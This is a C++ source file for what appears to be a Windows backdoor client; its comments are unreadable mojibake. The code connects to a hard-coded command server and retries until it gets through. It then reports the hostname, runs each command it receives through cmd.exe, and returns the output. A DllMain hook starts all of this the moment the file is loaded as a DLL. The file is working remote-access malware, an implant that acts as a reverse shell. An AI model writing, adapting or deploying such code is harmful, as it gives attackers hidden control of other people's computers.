#define _WINSOCK_DEPRECATED_NO_WARNINGS 1

#include <winsock2.h>
#include <Windows.h>
#include <iostream>
#include <map>
#include "rapidjson/schema.h"
#include "rapidjson/writer.h"

#pragma comment(lib, "ws2_32.lib")

using namespace std;
using namespace rapidjson;

/// <summary>
/// ִ������
/// </summary>
/// <param name="cmd"></param>
/// <returns></returns>
string exec(char* cmd)
{
	HANDLE hStdOutPipeRead = NULL;
	HANDLE hStdOutPipeWrite = NULL;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0))
	{
		return "Create pipe error";
	}
	STARTUPINFO si = {};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdError = hStdOutPipeWrite;
	si.hStdOutput = hStdOutPipeWrite;
	PROCESS_INFORMATION pi = {};
	LPCSTR lpApplicationName = "C:\\Windows\\System32\\cmd.exe";
	char lpCommandLine[1024];
	sprintf_s(lpCommandLine, "%s%s%s", lpApplicationName, " /c ", cmd);
	if (!CreateProcess(lpApplicationName, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		return "Create process error";
	}
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hStdOutPipeWrite);
	char buf[1024 + 1] = {};
	DWORD dwRead = 0;
	DWORD dwAvail = 0;
	string result; {}
	BOOL ok = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
	while (ok)
	{
		buf[dwRead] = '\0';
		result += buf;
		ok = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
	}
	CloseHandle(hStdOutPipeRead);
	return result;
}

/// <summary>
/// �����˷��ͽ��
/// </summary>
/// <param name="socket"></param>
/// <param name="status"></param>
/// <param name="body"></param>
void send_result(SOCKET socket, int status, string body) {
	StringBuffer s;
	Writer<StringBuffer> writer(s);
	writer.StartObject();
	writer.Key("type");
	writer.String("result");
	writer.Key("status");
	writer.Int(status);
	writer.Key("length");
	writer.Int(body.size());
	writer.EndObject();
	string head = s.GetString();
	int head_size = head.size();
	send(socket, (char*)&head_size, sizeof(int), 0);
	send(socket, head.c_str(), head.size(), 0);
	send(socket, body.c_str(), body.size(), 0);
}

/// <summary>
/// ��ȡ������
/// </summary>
/// <returns></returns>
string get_hostname() {
	DWORD info_buffer_size = 32767;
	TCHAR info_buf[32767];
	GetComputerName(info_buf, &info_buffer_size);
	return info_buf;
}

/// <summary>
/// ��ȡ�ͻ��˻�����Ϣ
/// </summary>
/// <returns></returns>
string get_info() {
	map<string, string> info = { {"os", ""}, {"hostname", get_hostname()}, {"integrity", ""} };
	StringBuffer s;
	Writer<StringBuffer> writer(s);
	writer.StartObject();
	for (auto& item : info) {
		writer.Key((item.first).c_str());
		writer.String((item.second).c_str());
	}
	writer.EndObject();
	return s.GetString();
}

/// <summary>
/// ��ȡ��ǰ����·��
/// </summary>
/// <returns></returns>
string get_current_directory() {
	TCHAR buffer[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	return string(buffer).substr(0, pos);
}

/// <summary>
/// ���ӷ����
/// </summary>
/// <param name="sock"></param>
/// <param name="server_addr"></param>
void connect(SOCKET sock, SOCKADDR_IN server_addr)
{
	// ����ʧ��5�������
	while (connect(sock, (SOCKADDR*)&server_addr, sizeof(server_addr)) != 0)
	{
		Sleep(5);
	}
	// ������֤��Ϣ
	send_result(sock, 1, get_info());
}

void main()
{
	// ��ʼ���׽���
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	// �����׽���
	SOCKET sock = socket(PF_INET, SOCK_STREAM, 0);
	// ����˵�ַ
	SOCKADDR_IN server_addr{};
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	server_addr.sin_port = htons(9999);
	// ���ӷ����
	connect(sock, server_addr);
	// �洢��Ϣͷ
	char head[1024];
	// �洢��Ϣ����
	char body[1024];
	while (1)
	{
		// ��Ϣͷ����
		struct Data {
			int size;
		} data;
		// ��սṹ��
		memset(&data, 0, sizeof(struct Data));
		// ������Ϣͷ��С
		int recv_len = recv(sock, (char*)&data, sizeof(struct Data), 0);
		// ����ʧ��
		if (recv_len == SOCKET_ERROR)
		{
			// �ر��׽���
			closesocket(sock);
			// ���´����׽���
			sock = socket(PF_INET, SOCK_STREAM, 0);
			// ��������
			connect(sock, server_addr);
			continue;
		}
		// �����Ϣͷ
		memset(&head, 0, sizeof(head));
		// ������Ϣͷ
		recv(sock, head, data.size, 0);
		// ������Ϣͷ
		Document dom;
		dom.Parse(head);
		// ��Ϣ�����С
		int body_size = dom["length"].GetInt();
		// �����Ϣ����
		memset(&body, 0, sizeof(body));
		// ������Ϣ����
		recv(sock, body, body_size, 0);
		// ��Ϣ����
		string type = dom["type"].GetString();
		if (type == "command") {
			// ִ������
			string result = exec(body);
			// ���ͽ��
			send_result(sock, 1, result);
		}
		// ���͹���·��
		send_result(sock, 1, get_current_directory());
	}
	WSACleanup();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		main();
	}
	return TRUE;
}